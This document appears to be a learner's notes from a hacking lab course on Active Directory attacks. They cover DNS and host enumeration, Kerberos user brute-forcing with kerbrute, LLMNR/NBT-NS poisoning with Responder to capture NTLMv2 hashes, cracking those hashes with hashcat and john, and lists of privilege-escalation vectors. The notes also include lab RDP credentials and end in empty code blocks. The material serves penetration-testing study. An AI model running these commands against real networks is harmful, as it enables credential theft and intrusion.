# Active Directory Enum and Attacks 

## DNS enum

```bash
dig +short A inlanefreight.com
dig +short AAAA inlanefreight.com
dig +short NS inlanefreight.com
dig +short MX inlanefreight.com
dig +short TXT inlanefreight.com
```

## Host discovery

Passively look for things like ARP and MDNS broadcasts over the wire
- [wireshark](https://www.wireshark.org/)
- [tcpdump](https://www.tcpdump.org/)
- [netminer](https://www.netminer.com)
- [net-creds](https://github.com/DanMcInerney/net-creds)
- [responder](https://github.com/SpiderLabs/Responder)
- [fping](https://fping.org/)

Passive
```bash
sudo -E wireshark
sudo tcpdump -i wlan0
sudo responder -I tun0 -i 10.10.14.211 -v
sudo responder -I tun0 -A 
```

Active
```bash
fping -asqg 192.168.0.0/24
sudo nmap -v -A -iL hosts.txt -oN ./host-enum
```

## User discovery

Kerbrute takes advantage of the fact that kerberos pre-auth failures often do not trigger alerts or logs.

- [kerbrute](https://github.com/ropnop/kerbrute)
- [inside-trust](https://github.com/insidetrust/statistically-likely-usernames)

Brute-force enumerating users
```bash
kerbrute userenum \
  -d INLANEFREIGHT.LOCAL \
  --dc 172.16.5.5 \
  jsmith.txt \
  -o valid_ad_users
```

## Typical windows user access levels
- Standard User: Limited control, cannot modify system settings or install software.
- Guest: Very restricted, for temporary users who don’t need to make system changes.
- Administrator: Full control over the system, typically used by the main user of the machine.
- NT AUTHORITY\SYSTEM: Highest-level system account, used by Windows itself to perform essential operations.
- Local Service/Network Service: Limited accounts for services, with specific access needs.
- Power User: Intermediate access between Standard User and Administrator (less relevant in modern Windows). 

- SeImpersonate - A mechanism a little bit like sudo (as I understand it)

## Potential Vectors to SYSTEM access
- Remote exploits: MS08-067, EternalBlue, or BlueKeep
- Abusing services running as `NT AUTHORITY\SYSTEM`
- Abusing the `SeImpersonate` to gain system using [JuicyPotato](https://github.com/ohpe/juicy-potato) (probably obsolete)
- Abusing Windows 10 Task Scheduler 0-day. (probably obsolete)
- Gaining Admin access with a local account and using PsExec to get to `NT AUTHORITY\SYSTEM`

## potential things to do once we get SYSTEM access
- Enumerate the domain with built-in tools
- Enumerate the domain with BloodHound
- Enumerate the domain with Powerview
- Perform KerbeRoasting within the domain
- Perform ASREPRoasting within the domain
- Perform Net-NTLMv2 hash gathering with tools such as `Inveigh`
- Perform SMB relay attacks - Token impersonation to escalate to a privileged domain user
- Perform ACL Attacks
- LLMNR Poisoning - Link-Local Multicast Name Resolution
- NBT-NS Poisoning - NetBIOS Name Service


## LLMNR/NBT-NS Poisoning from Linux with Responder

Get NTLMv2 hashes with responder
```bash
vim /usr/share/responder/Responder.conf
sudo responder -I tun0 -i 10.10.14.211 -v
sudo responder -I ens224 -A 
sudo responder -I ens224 -wrf
ls -la /usr/share/responder/logs
grep wley /usr/share/responder/logs/*
grep backup /usr/share/responder/logs/*
```

Crack them
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
hashcat -m 5600 backup /usr/share/wordlists/rockyou.txt
john --wordlist=~/.local/share/seclists/rockyou.txt wley
john wley --show
```

## LLMNR/NBT-NS Poisoning from Windows with Inveigh

- Inveigh - verb: speak or write about (something) with great hostility. "He liked to inveigh against all forms of academic training"

```bash
rdesktop -g 75% -u htb-student -P -z 10.129.119.7:3389
rdesktop -g 75% -P -u 'htb-student' -p 'Academy_student_AD!' -z 10.129.230.228:3389
xfreerdp3 /v:10.129.230.228:3389 /u:'htb-student' /v:'Academy_student_AD!'
```

```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```

